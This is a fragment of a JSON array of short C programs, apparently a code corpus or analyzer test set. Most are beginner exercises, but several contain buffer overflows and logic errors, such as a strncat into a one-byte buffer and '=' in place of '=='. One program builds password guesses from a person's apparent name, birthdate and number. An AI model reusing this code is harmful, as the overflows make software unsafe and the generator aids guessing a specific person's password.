[30]:\\t55\",\n      \"REG [30]:\\t5050\",\n      \"REG [30]:\\t500500\",\n      \"REG [30]:\\t50005000\"\n    },\n    {\n      \"REG [30]:\\t0\\nREG [30]:\\t0\\nREG [30]:\\t0\",\n      \"REG [30]:\\t1\\nREG [30]:\\t1\\nREG [30]:\\t1\",\n      \"REG [30]:\\t3\\nREG [30]:\\t3\\nREG [30]:\\t3\",\n      \"REG [30]:\\t6\\nREG [30]:\\t6\\nREG [30]:\\t6\",\n      \"REG [30]:\\t10\\nREG [30]:\\t10\\nREG [30]:\\t10\",\n      \"REG [30]:\\t15\\nREG [30]:\\t15\\nREG [30]:\\t15\",\n      \"REG [30]:\\t55\\nREG [30]:\\t55\\nREG [30]:\\t55\",\n      \"REG [30]:\\t5050\\nREG [30]:\\t5050\\nREG [30]:\\t5050\",\n      \"REG [30]:\\t500500\\nREG [30]:\\t500500\\nREG [30]:\\t500500\",\n      \"REG [30]:\\t50005000\\nREG [30]:\\t50005000\\nREG [30]:\\t50005000\"\n    }\n  };\n  errors = 0;\n  for (i = 0; i < 3; i++) {\n    for (j = 0; j < 10; j++) {\n      sprintf(cmd1, \"sed -e 's/&&/%d/g' %s > temp.cvm\", inputs[i][j], files[i]);\n      system(cmd1);\n      system(\"./vm.out run temp.cvm > output.txt 2>&1\");\n      sprintf(cmd2, \"echo '%s' > output-corr.txt\", outputs[i][j]);\n      system(cmd2);\n      if (system(\"diff -q output.txt output-corr.txt\")) {\n        errors++;\n        printf(\"ERROR: \\t[%d] [%d]\\n\", i, j);\n      }\n    }\n  }\n  system(\"rm -rf temp.cvm\");\n  system(\"rm -rf output.txt\");\n  system(\"rm -rf output-corr.txt\");\n  printf(\"DONE\\n\");\n  return errors;\n}",
    "#include <stdio.h>\n\nvoid posso_votar()\n{\n  int data_nasc, data_atual, idade;\n  printf(\"\\n\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52CALCULAR O MAIOR VALOR\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52 \\n\");\n  printf(\" Digite o ano atual: \");\n  scanf(\"%d\", &data_atual);\n  printf(\" Digite o ano de nascimento: \");\n  scanf(\"%d\", &data_nasc);\n  idade = (data_atual - data_nasc);\n  printf(\" A idade atual e: \"\n         \"%d\",\n         idade);\n  if (idade >= 16)\n    printf(\" Pode votar!! \");\n  else\n    printf(\" N\u00e3o pode votar!! \");\n}\nvoid calular_o_maior_valor()\n{\n  int A, B, C;\n  printf(\"\\n\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52CALCULAR O MAIOR VALOR\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52 \\n\");\n  printf(\"\\n \\n\");\n  printf(\" Digite o valor de A: \");\n  scanf(\"%d\", &A);\n  printf(\" Digite o valor de B: \");\n  scanf(\"%d\", &B);\n  printf(\" Digite o valor de C: \");\n  scanf(\"%d\", &C);\n  if ((A > B) && (A > C))\n    printf(\" O valor de A \u00e9 o maior!! \");\n  else if ((A = B) && (A > C))\n    printf(\" Os valores de A e B s\u00e3o os maiores!! \");\n  else if ((A > B) && (A = C))\n    printf(\" Os valores de A e C s\u00e3o os maiores!! \");\n  else if ((B > A) && (B > C))\n    printf(\" O valor de B \u00e9 o maior!! \");\n  else if ((B = A) && (B > C))\n    printf(\" Os valores de A e B s\u00e3o os maiores!! \");\n  else if ((B > A) && (B = C))\n    printf(\" Os valores de B e C s\u00e3o os maiores!! \");\n  else if ((C > A) && (C > B))\n    printf(\" O valor de C \u00e9 o maior!! \");\n  else if ((C > A) && (C = B))\n    printf(\" Os valores de B e C s\u00e3o os maiores!! \");\n  else if ((C = A) && (C > B))\n    printf(\" Os valores de A e C s\u00e3o os maiores!! \");\n  else\n    printf(\" Os valores s\u00e3o iguais \");\n}\nvoid opcao_nao_reconhecida()\n{\n  printf(\"\\e[1;1H\\e[2J\");\n  printf(\"\\n \\n \\n \\n \\n \\n \\n\");\n  printf(\"nosa como vose \u00e9 engrasado fera\");\n  printf(\"\\n \\n \\n \\n \\n \\n \\n\");\n  printf(\"\\e[1;1H\\e[2J\");\n}\nvoid menu()\n{\n  int opcao_selecionada;\n  printf(\"\\e[1;1H\\e[2J\");\n  printf(\"\\n\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52\u02da\u2206\u02daMENU\u02da\u2206\u02da\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52\ufe52 \\n\");\n  printf(\"\\n \\n\");\n  printf(\"Selecione um programa: \\n\");\n  printf(\" - Posso Votar               [Digite 0] \\n\");\n  printf(\" - Calcular O Maior Valor    [Digite 1] \\n\");\n  printf(\"\\n \\n \\n \\n \\n \\n \\n Selecionar a op\u00e7\u00e3o: \");\n  scanf(\"%d\", &opcao_selecionada);\n  printf(\"\\e[1;1H\\e[2J\");\n  switch (opcao_selecionada)\n  {\n  case 0:\n    posso_votar();\n    break;\n  case 1:\n    calular_o_maior_valor();\n    break;\n  default:\n    opcao_nao_reconhecida();\n    break;\n  }\n}\nint main()\n{\n  menu();\n  return 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    int width;\n    char dashes[] = \"--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\";\n    printf(\"Wie breit soll der Rahmen werden: \");\n    scanf(\"%i\", &width);\n    printf(\"+%.*s+\\n\", width, dashes);\n    printf(\"|%*s|\\n\", width, \"\");\n    printf(\"|%*s|\\n\", width, \"\");\n    printf(\"|%*s|\\n\", width, \"\");\n    printf(\"+%.*s+\\n\", width, dashes);\n    fflush((stdin));\n    getchar();\n    return 0;\n}",
    "#include<stdio.h>\nint main() {\n   printf(\"Hello, world!\\x34\");\n}",
    "#include <stdio.h>\nint main(void)\n{\n    int numero;\n    int i, qtde = 0;\n    printf(\"Insira um numero inteiro para verificar se \ufffd primo: \");\n    scanf(\"%d\", &numero);\n    for (i = 2; i <= numero / 2; i = i + 1)\n    {\n        if (numero % i == 0)\n        {\n            qtde++;\n            break;\n        }\n    }\n    if (qtde == 0)\n    {\n        printf(\"O numero %d e Primo !!!\\n\", numero);\n    }\n    else\n    {\n        printf(\"O numero %d nao e Primo !!!\\n\", numero);\n    }\n    return 0;\n}",
    "void Third()\n{\n return;\n}\nvoid Second()\n{\n Third();\n return;\n}\nvoid First()\n{\n Second();\n return;\n}\nint main()\n{\n First();\n return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n    int a[100001];\n    int i,n,x,k,l=0;\n    for(i=0;i<=100001;i++)\n        a[i]=0;\n    scanf(\"%d\",&n);\n    for(i=1;i<=n;i++)\n    {\n        scanf(\"%d\",&x);\n        a[x]++;\n    }\n    scanf(\"%d\",&k);\n    for(i=100001;i>=0;i--)\n    {\n        if(a[i]!=0)\n        {\n            l++;\n        }\n        if(l==k)\n        {\n            printf(\"%d %d\",i,a[i]);\n            return 0;\n        }\n    }\n}",
    "#include <stdio.h>\n#include <fcntl.h>\n#include <unistd.h>\n#include <stdlib.h>\n\n\nvoid oops(char*, char*);\nint main(int argc, char** argv)\n{\n    int in_fd, out_fd, n_chars;\n    char buf[4096];\n    if(argc!=3)\n    {\n        fprintf((stderr),\"usage:%s source destination\\n\",*argv);\n        exit(1);\n    }\n    if((in_fd=open(argv[1],(0x04000000)))==-1)\n        oops(\"Cann't open\", argv[1]);\n    if((out_fd=creat(argv[2],0644))==-1)\n        oops(\"Cann't creat\", argv[2]);\n    while((n_chars=read(in_fd,buf,4096))>0)\n        if(write(out_fd,buf,n_chars)!=n_chars)\n            oops(\"Write error to\", argv[2]);\n    if(n_chars==-1)\n        oops(\"Read error from\",argv[1]);\n    if(close(in_fd)==-1||close(out_fd)==-1)\n        oops(\"Close file error\",\"\");\n    return 0;\n}\nvoid oops(char* err,char* err2)\n{\n    fprintf((stderr),\"Error: %s\",err);\n    perror(err2);\n    exit(1);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint diff_numbers(int x, int y)\n{\n  return (x + y + abs(x - y)) / 2;\n}\nint main()\n{\n  int a, b, c;\n  scanf(\"%d %d %d\", &a, &b, &c);\n  int a_b = diff_numbers(a, b);\n  int a_c = diff_numbers(a, c);\n  int c_b = diff_numbers(c, b);\n  int greast;\n  if (a_b == a_c)\n  {\n    greast = a_b;\n  }\n  else if (a_b == c_b)\n  {\n    greast = a_b;\n  }\n  else if (a_c = c_b)\n  {\n    greast = c_b;\n  }\n  printf(\"%d eh o maior\\n\", greast);\n  return 0;\n}",
    "#include<stdio.h>\n\n\nint main(void)\n{\n const float rain[5][12]=\n {\n  {4.3,4.3,4.3,3.0,2.0,1.2,0.2,0.2,0.4,2.4,3.5,6.6},\n  {8.5,8.2,1.2,1.6,2.4,0.0,5.2,0.9,0.3,0.9,1.4,7.3},\n  {9.1,8.5,6.7,4.3,2.1,0.8,0.2,0.2,1.1,2.3,6.1,8.4},\n  {7.2,9.9,8.4,3.3,1.2,0.8,0.4,0.0,0.6,1.7,4.3,6.2},\n  {7.6,5.6,3.8,2.8,3.8,0.2,0.0,0.0,0.0,1.3,2.6,5.2}\n };\n int year,month;\n float subtot,total;\n printf(\"YEAR   RAINFALL  (inches)\\n\");\n for(year=0,total=0;year<5;year++)\n {\n  for(month=0,subtot=0;month<12;month++)\n    subtot+=rain[year][month];\n  printf(\"%5d  %15.1f\\n\",2010+year,subtot);\n  total+=subtot;\n }\n printf(\"\\n The yearly average is %.1f inches.\\n\\n\",total/5);\n printf(\"MONTHLY AVERAGES:\\n\\n\");\n printf(\"Jan Feb Mar Apr MAY Jun Jul Aug Sep Oct\");\n printf(\" Nov Dec\\n\");\n for(month=0;month<12;month++)\n {\n  for(year=0,subtot=0;year<5;year++)\n  subtot+=rain[year][month];\n  printf(\"%4.1f\",subtot/5);\n }\n printf(\"\\n\");\n return 0;\n}",
    "#include <stdio.h>\nint main(void){\n printf(\"2 == 2 devuelve %d que implica verdadero\\n\"\n ,2 == 2);\n printf(\"'A' == 'a' devuelve %d que implica falso\\n\"\n ,'A' == 'a');\n printf(\"2 != 2 devuelve %d que implica falso\\n\"\n ,2 != 2);\n printf(\"'A' != 'a' devuelve %d que implica verdadero\\n\"\n ,'A' != 'a');\n printf(\"'a' > 'b' devuelve %d que implica falso\\n\"\n ,'a' > 'b');\n printf(\"'b' > 'a' devuelve %d que implica verdadero\\n\"\n ,'b' > 'a');\n printf(\"'1' >= '1' devuelve %d que implica verdadero\\n\"\n ,'1' >= '1');\n printf(\"4 >= 5 devuelve %d que implica falso\\n\"\n ,4 >= 5);\n printf(\"'Z' < 'a' devuelve %d que implica verdadero\\n\"\n ,'Z' < 'a');\n printf(\"'A' < 'B' devuelve %d que implica verdadero\\n\"\n ,'A' < 'B');\n printf(\"6 <= 6 devuelve %d que implica verdadero\\n\"\n ,6 <= 6);\n printf(\"8 <= 7 devuelve %d que implica falso\\n\"\n ,8 <= 7);\n return 0;\n}",
    "#include <stdio.h>\n#include<stdlib.h>\n#include<time.h>\nint cc(void){\n int a=rand()%4;\n switch(a){\n  case 0:return 'C';\n  case 1:return 'H';\n  case 2:return 'O';\n  case 3:return 'N';\n  default:return 'O';\n }\n return 'H';\n}\nint main(void){\n srand(time(((void*)0)));\n int data=rand()%100;\n printf(\"%d\\n\",data);\n while(data--){\n  do{\n   putchar(cc());\n   int num=rand()%25;\n   if(num<=1);\n   else printf(\"%d\",num);\n  } while(rand()%4!=0);\n  putchar('\\n');\n }\n return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n    int cmd;\n    float balance = 0.0f, credit, debit;\n    printf(\"*** ACME checkbook-balancing program **\\n\");\n    printf(\"Commands: 0=clear, 1=credit, 2=debit, \");\n    printf(\"3=balance, 4=exit\\n\\n\");\n    for (;;) {\n        printf(\"Enter command: \");\n        scanf(\"%d\", &cmd);\n        switch (cmd) {\n            case 0:\n                balance = 0.0f;\n                break;\n            case 1:\n                printf(\"Enter amount of credit: \");\n                scanf(\"%f\", &credit);\n                balance += credit;\n                break;\n            case 2:\n                printf(\"Enter amount of debit: \");\n                scanf(\"%f\", &debit);\n                balance -= debit;\n                break;\n            case 3:\n                printf(\"Current balance: $%.2f\\n\", balance);\n                break;\n            case 4:\n                return 0;\n            default:\n                printf(\"Commands: 0=clear, 1=credit, 2=debit, \");\n                printf(\"3=balance, 4=exit\\n\\n\");\n                break;\n        }\n    }\n}",
    "#include <stdio.h>\nunsigned long int factorial(unsigned int i) {\n   if(i <= 1) {\n      return 1;\n   }\n   return i * factorial(i - 1);\n}\nint main()\n{\n   int i = 12;\n   printf(\"Factorial of %d is %d\\n\", i, factorial(i));\n   return 0;\n}",
    "#include <stdio.h>\n\nint getNumber(char *p){\n    int number = 0;\n    int i = 1;\n    while(*p != '\\0')\n        number += (*p++ - '/') * i++;\n    return number;\n}\nint main(){\n    char name[31];\n    char state[4];\n    char visited[40000], killjugde[40000];\n    int n, number, kill = 0, AC = 0;\n    scanf(\"%d\", &n);\n    while(n--){\n        scanf(\"%s%s\", name, state);\n        number = getNumber(name);\n        if(*state == 'A'){\n            if(visited[number] == 0)AC++;\n            if(killjugde[number] == 0){\n                kill++;\n                killjugde[number] = 1;\n            }\n            visited[number] = 1;\n        }\n        else if(killjugde[number] == 1){\n            kill--;\n            killjugde[number] = 0;\n        }\n    }\n    printf(\"%d%%\\n\",(kill*100)/AC);\n}",
    "#include<stdio.h>\n#include<string.h>\nint main(){\n    char equipe[] = \"Equipe Tera\";\n    char nome[7];\n    strncpy(nome, equipe, 6);\n    nome[7] = '\\0';\n    printf(\"Nome: %s\",nome);\n    return 0;\n}",
    "#include<stdio.h>\n#include<string.h>\nint main(void) {\n    char text[1000];\n    do {\n        printf(\"Input text (quit to exit): \");\n        fgets(text, 1000, (stdin));\n        text[strlen(text) - 1] = '\\0';\n    } while(strcmp(text, \"quit\") != 0);\n    return 0;\n}",
    "#include <stdio.h>\nint get_max(int a, int b, int c)\n{\n    int m = 0;\n    if(a > b){\n        m = a;\n        if(c > m){\n            m = c;\n        }\n    }else{\n        m = b;\n        if(c > m){\n            m = c;\n        }\n    }\n    return m;\n}\nint main()\n{\n    int x, y, z, m;\n    scanf(\"%d %d %d\", &x, &y, &z);\n    m = get_max(x, y, z);\n    printf(\"max(%d, %d, %d) = %d\\n\", x, y, z, m);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\nvoid mergeMix(int arrayA[], int temp[], int left, int mid, int right) {\n        int i;\n        int numOfElements;\n        int leftEnd = mid - 1;\n        int tmpPosition;\n        tmpPosition = left;\n        numOfElements = right - left + 1;\n        while ((left <= leftEnd) && (mid <= right)) {\n                if (arrayA[left] <= arrayA[mid]) {\n                        temp[tmpPosition] = arrayA[left];\n                        tmpPosition = tmpPosition + 1;\n                        left = left + 1;\n                } else {\n                        temp[tmpPosition] = arrayA[mid];\n                        tmpPosition = tmpPosition + 1;\n                        mid = mid + 1;\n                }\n        }\n        while (left <= leftEnd) {\n                temp[tmpPosition] = arrayA[left];\n                tmpPosition = tmpPosition + 1;\n                left = left + 1;\n        }\n        while (mid <= right) {\n                temp[tmpPosition] = arrayA[mid];\n                tmpPosition = tmpPosition + 1;\n                mid = mid + 1;\n        }\n        for (i = 0; i <= numOfElements; i++) {\n                arrayA[right] = temp[right];\n                right = right - 1;\n        }\n}\nvoid mergeSort(int numbers[], int temp[], int left, int right) {\n        int mid;\n        if (right > left) {\n                mid = (right + left) / 2;\n                mergeSort(numbers, temp, left, mid);\n                mergeSort(numbers, temp, mid + 1, right);\n                mergeMix(numbers, temp, left, mid + 1, right);\n        }\n}\nint A[10]={101, 89, 11, 45, 67, 89, 18, 15, 34, 23};\nvoid quicksort(int a, int b){\n        int leftarr[10];\n        int rtarr[10];\n        int ltidx=0;\n        int rtidx=0;\n        int k=a;\n        int l=0;\n        int pivot=A[a];\n        if(a==b) return;\n        while(k<b) {\n                ++k;\n                if(A[k]<A[a]) {\n                        leftarr[ltidx]=A[k];\n                        ltidx++;\n                }\n                else{\n                        rtarr[rtidx]=A[k];\n                        rtidx++;\n                }\n        }\n        k=a;\n        for(l=0; l<ltidx; ++l) A[k++]=leftarr[l];\n        A[k++]=pivot;\n        for(l=0; l<rtidx; ++l) A[k++]=rtarr[l];\n        if(ltidx>0) quicksort(a,a+ltidx-1);\n        if(rtidx>0) quicksort(b-rtidx+1,b);\n}\nint main(int argc, char** argv) {\n        int i;\n        int arrayTest[10] = {11, 56, 3, 6, 32, 69, 34, 74, 99, 1};\n        int temp[10];\n        clock_t start, stop;\n        double t = 0.0;\n        start = clock();\n        for (i = 0; i < 10; i++) {\n                printf(\"%d \", A[i]);\n        }\n        printf(\"\\n\");\n        quicksort(0, 9);\n        for (i = 0; i < 10; i++) {\n                printf(\"%d \", A[1]);\n        }\n        printf(\"\\n\");\n        stop = clock();\n        t =((double) (stop - start)) / ((clock_t)1000000000);\n        printf(\"%f seconds to execute \\n\", t);\n        return (0);\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nchar* base_element[] = {\n \"jiajia\",\n \"jia\",\n \"sy\",\n \"1195594964\",\n \"119\",\n \"119559\",\n \"1998\",\n \"19980812\",\n \"0812\"\n};\nchar* base_element_v[] = {\n \"jia\",\n \"1998\",\n \"0812\",\n \"sy\"\n};\nchar* short_elem[] = {\n \"jia\",\n \"jiajia\",\n \"0812\",\n \"1998\"\n};\nvoid short_pwd(){\n for( size_t i = 0; i < 4; i++){\n  for(size_t j = 0; i < 4; j++){\n   printf(\"%s%s\",short_elem[i], short_elem[j]);\n  }\n }\n}\nint main(int argc, char *argv[])\n{\n for(size_t i = 0; i < 9; i++){\n  for(size_t j = 0; j < 9; j++){\n   printf(\"%s%s\\n\",base_element[i],base_element[j]);\n  }\n }\n return 0;\n}",
    "#include <string.h>\n#include <stdlib.h>\n#include <stdio.h>\nint main()\n{\n  char buf1[1];\n  char string[] = \"A string\";\n  buf1[0] = '\\0';\n  strncat(buf1, string, sizeof(string));\n  printf(\"%s\\n\", buf1);\n  return 0;\n}",
    "int main(){\n int x = 4;\n if (x) x = 3;\n else x = 2;\n return x;\n}",
    "#include <stdio.h>\n\n\n\n\n\nint main(int argc, char **argv)\n\n{\n    printf(\"Hello\");\n    return 0;\n}",
    "#include <stdio.h>\n#include <limits.h>\n#include <float.h>\nint main()\n{\n    printf(\"signed char: %d to %d\\n\", (-127 -1), 127);\n    printf(\"unsigned char: 0 to %d\\n\\n\", (127*2 +1));\n    printf(\"signed short: %hi to %hi\\n\", (-32767 -1), 32767);\n    printf(\"unsigned short: 0 to %hu\\n\\n\", (32767 *2 +1));\n    printf(\"signed int: %d to %d\\n\", (-2147483647 -1), 2147483647);\n    printf(\"unsigned int: 0 to %i\\n\\n\", (2147483647 *2U +1U));\n    printf(\"signed long: %ld to %ld\\n\", (-2147483647L -1L), 2147483647L);\n    printf(\"unsigned long: 0 to %lu\\n\\n\", (2147483647L *2UL+1UL));\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\nint main()\n{\n    srand(time(((void*)0)));\n    int mysteriousNumber=0,counter=0,enteredNumber=0,playAgain=0,level;\n        printf(\"== Levels ==\\n\");\n        printf(\"1. Easy\\n\");\n        printf(\"2. Intermediate\\n\");\n        printf(\"3. Hard\\n\");\n        scanf(\"%d\",&level);\n        if (level==1)\n        {\n    int mysteriousNumber=0,counter=0,enteredNumber=0,playAgain=0,level;\n    const int MAX=10,MIN=0;\n    do\n    {\n        counter=0;\n    mysteriousNumber=(rand()%(MAX-MIN+1))+MIN;\n    while (enteredNumber!=mysteriousNumber)\n    {\n    printf(\"Please enter the mysterious number\\n\");\n    scanf(\"%d\",&enteredNumber);\n        if (enteredNumber>mysteriousNumber)\n            printf(\"You've entered a bigger number, please try again \\n\\n\");\n        else if (enteredNumber<mysteriousNumber)\n            printf(\"You've entered a smaller number, please try again \\n\\n\");\n        else\n              {\n               printf(\"Brave, You've entered the mysterious number after %d times\\n\",(counter+1));\n               printf(\"Do you want to play again?\\n\");\n               printf(\"Press 1 to play again \\n\");\n               scanf(\"%d\",&playAgain);\n              }\n        counter++;\n    }\n    }\n    while (playAgain==1);\n                }\nelse if (level==2)\n{\n     int mysteriousNumber=0,counter=0,enteredNumber=0,playAgain=0,level;\n                 const int MAX=100,MIN=0;\n                 do\n    {\n        counter=0;\n    mysteriousNumber=(rand()%(MAX-MIN+1))+MIN;\n    while (enteredNumber!=mysteriousNumber)\n    {\n    printf(\"Please enter the mysterious number\\n\");\n    scanf(\"%d\",&enteredNumber);\n        if (enteredNumber>mysteriousNumber)\n            printf(\"You've entered a bigger number, please try again \\n\\n\");\n        else if (enteredNumber<mysteriousNumber)\n            printf(\"You've entered a smaller number, please try again \\n\\n\");\n        else\n              {\n               printf(\"Brave, You've entered the mysterious number after %d times\\n\",(counter+1));\n               printf(\"Do you want to play again?\\n\");\n               printf(\"Press 1 to play again \\n\");\n               scanf(\"%d\",&playAgain);\n              }\n        counter++;\n    }\n    }\n    while (playAgain==1);\n        }\nelse if (level==3)\n{\n     int mysteriousNumber=0,counter=0,enteredNumber=0,playAgain=0,level;\n                 const int MAX=1000,MIN=0;\n                 do\n    {\n        counter=0;\n    mysteriousNumber=(rand()%(MAX-MIN+1))+MIN;\n    while (enteredNumber!=mysteriousNumber)\n    {\n    printf(\"Please enter the mysterious number\\n\");\n    scanf(\"%d\",&enteredNumber);\n        if (enteredNumber>mysteriousNumber)\n            printf(\"You've entered a bigger number, please try again \\n\\n\");\n        else if (enteredNumber<mysteriousNumber)\n            printf(\"You've entered a smaller number, please try again \\n\\n\");\n        else\n              {\n               printf(\"Brave, You've entered the mysterious number after %d times\\n\",(counter+1));\n               printf(\"Do you want to play again?\\n\");\n               printf(\"Press 1 to play again \\n\");\n               scanf(\"%d\",&playAgain);\n              }\n        counter++;\n    }\n    }\n    while (playAgain==1);\n}\nelse\n    printf(\"Please enter a number from 1:3\\n\");\n        }",
    "#include <stdio.h>\nint main() {\n  return printf(\"hello world!\\n\");\n}",
    "#include <stdio.h>\nint main()\n{\n    int number1 = 0, number2 = 0, maior = 0;\n    printf(\"Digite dois valores naturais (0-9): \");\n    scanf(\"%d %d\", &number1, &number2);\n    if ((number1 >= 0 && number1 < 10) && (number2 >= 0 && number2 < 10))\n    {\n        if (number1 == number2)\n        {\n            printf(\"Os valores inseridos %d e %d sao iguais! \\n\", number1, number2);\n        }\n        else\n        {\n            if (number1 > number2)\n            {\n                maior = number1;\n                printf(\"O valor valor e: %d\", maior);\n            }\n            else\n            {\n                maior = number2;\n                printf(\"O valor valor e: %d\", maior);\n            }\n        }\n    }\n    else\n    {\n        printf(\"Valor(es) fora da escala dos naturais(0-9)!\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\nint main()\n{\n    int n;\n    scanf(\"%d\", &n);\n    int size = n;\n    int a[n];\n    int b[n];\n    for (int i = 0; i < n; i++)\n    {\n        scanf(\"%d\", &a[i]);\n    }\n    for (int i = 0; i < n; i++)\n    {\n        int sum = 0;\n        n = a[i];\n        while (n > 5)\n        {\n            n = n / 5;\n            sum += n;\n        }\n        b[i] = sum;\n    }\n    int product = 1;\n    for (int i = 0; i <= n; i++)\n    {\n        product = product * b[i];\n    }\n    printf(\"%d \", product);\n}",
    "#include <stdio.h>\n#include <errno.h>\n#include <string.h>\nint main(int argc, char * argv[]) {\n    FILE *inp, *out;\n    char line[128];\n    if (argc != 3) {\n        printf(\"usage: pname source_file target_file\\n\");\n        return 1;\n    }\n    if ((inp = fopen(argv[1], \"rt\")) == ((void*)0)) {\n        printf(\"Cannot open %s\\n\", argv[1]);\n        return 2;\n    }\n    if ((out = fopen(argv[2], \"wt\")) == ((void*)0)) {\n        printf(\"Cannot create %s\\n\", argv[2]);\n        fclose(inp);\n        return 3;\n    }\n    while((fgets(line, sizeof(line),inp)) != ((void*)0)) {\n        if(fputs(line,out) == (-1)) {\n            break;\n        }\n    }\n    fclose(inp);\n    fclose(out);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\nint main(void)\n{\n int escolha;\n int usuario;\n int computador;\n srand(time(((void*)0)));\n escolha = rand() % 2;\n printf(\"Eu (computador) escolhi %s.\\n\", escolha ? \"impar\" : \"par\");\n printf(\"Entre com o seu numero: \");\n scanf(\"%d\", &usuario);\n computador = rand() % 10;\n printf(\"Computador: %d\\n\", computador);\n if (((usuario + computador) % 2) == escolha) {\n  printf(\"Eu (computador) ganhei!\\n\");\n } else {\n  printf(\"Voce (usuario) ganhou!\\n\");\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint convertToNumber(int d1, int d2, int d3) {\n    return d3 + (d2 * 10) + (d1 * 100);\n}\nint f(int number) {\n    int digit1, digit2, digit3;\n    int initialNumber = number;\n    digit3 = number % 10;\n    number /= 10;\n    digit2 = number % 10;\n    number /= 10;\n    digit1 = number;\n    printf(\"Digits: %d %d %d\\n\", digit1, digit2, digit3);\n    if (digit1 != digit2 && digit2 != digit3 && digit1 != digit3) return initialNumber;\n    if (digit1 == digit2 && digit1 == digit3) {\n        digit1--;\n        if (digit3 != 9) digit3++;\n        printf(\"Got digits: %d %d %d\\n\", digit1, digit2, digit3);\n        return convertToNumber(digit1, digit2, digit3);\n    }\n    digit1 ^= digit3;\n    digit3 ^= digit1;\n    digit1 ^= digit3;\n    return convertToNumber(digit1, digit2, digit3);\n}\nint main() {\n    int number;\n    while (1) {\n        printf(\"Enter number: \");\n        scanf(\"%d\", &number);\n        if (number < 1e2 || number >= 1e3) printf(\"Invalid number entered, try again.\\n\");\n        else break;\n    }\n    printf(\"Number received: %d\\n\\n\", number);\n    printf(\"Result: %d\\n\", f(number));\n    system(\"pause\");\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdbool.h>\n_Bool isPrime(unsigned int i) {\n unsigned int n;\n for (n = 2; n <= i/2; n++) {\n  if (i%n == 0)\n   return 0;\n }\n return 1;\n}\nint main(int argc, const char *argv[]) {\n unsigned int n = 0;\n unsigned int i = 1;\n while(n < 10001) {\n  if (isPrime(++i)) {\n   n++;\n  }\n }\n printf(\"%d\\n\", i);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(void){\n    int num, soma, media, op;\n    soma = 0;\n    for(op = 1; op <= 9; op++){\n        printf(\"\\nDigite dez numeros inteiros e iremos calcular sua media: \");\n        scanf(\"%d\", &num);\n        soma = num + soma;\n    }\n    media = soma / op;\n    printf(\"\\nA media e: %d\", media);\n    return(0);\n}",
    "#include <stdio.h>\n#include <math.h>\ndouble func(double x, double y){\n  return sin(x) + cos(y);\n}\nint main(){\n  double y_initial, x_initial, h_interval, x_final;\n  printf(\"For the function f(x) = sin(x)+cos(y) :\\n\");\n  printf(\"Enter initial values (x, y):\");\n  scanf(\"%lf %lf\", &x_initial, &y_initial);\n  printf(\"Enter interval to be taken:\");\n  scanf(\"%lf\", &h_interval);\n  printf(\"Enter final value of x at which y is to be calculated:\");\n  scanf(\"%lf\", &x_final);\n  while (x_initial + h_interval < x_final){\n    printf(\"%g\\t%g\\t%g\\t\", x_initial, y_initial, func(x_initial, y_initial));\n    y_initial += h_interval * func(x_initial, y_initial);\n    printf(\"%g\\n\", y_initial);\n    x_initial += h_interval;\n  }\n  printf(\"The value of y at x=%lf is : %lf\\n\", x_final, y_initial);\n  return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    char Str[100];\n    unsigned short int Posicao = 0;;\n    printf(\"Digite seu nome: \");\n    scanf(\"%[^\\n]\", Str);\n    fflush((stdin));\n    for (int i = 0 ; Str[i] != '\\0'; i++)\n    {\n        if (Str[i] == ' ')\n            Posicao = i+1;\n    }\n    printf(\"Seja bem-vindo(a) Sr(a). \");\n    for (Posicao; Str[Posicao] != '\\0'; Posicao++)\n    {\n        printf(\"%c\", Str[Posicao]);\n    }\n    printf(\"\\n\");\n    return 0;\n}",
    "#include<stdio.h>\nint main() {\n int horas,min,seg,t1,t2,t3,total;\n printf(\"Digite el numero de horas: \");\n scanf(\"%i\",&horas);\n printf(\"Digite el numero de minutos: \");\n scanf(\"%i\",&min);\n printf(\"Digite el numero de segundos: \");\n scanf(\"%i\",&seg);\n t1 = horas * 3600;\n t2 = min * 60;\n t3 = seg * 1;\n total = t1 + t2 + t3;\n printf(\"El equivalente en segundos es: %i\",total);\n return 0;\n}",
    "int\nmain(int argc, char *argv[])\n{\n        int v[1];\n        int (*p)[];\n        int (*f1)(int ,char *[]);\n        int (*f2)(int ,char *[]);\n        v[0] = 0;\n        p = &v;\n        f1 = &main;\n        f2 = main;\n        if (argc == 0)\n                return 1;\n        if ((****main)(0, 0))\n                return 2;\n        if ((****f1)(0, 0))\n                return 3;\n        if ((****f2)(0, 0))\n                return 4;\n        if (!(*p)[0])\n                return 0;\n        return 1;\n}",
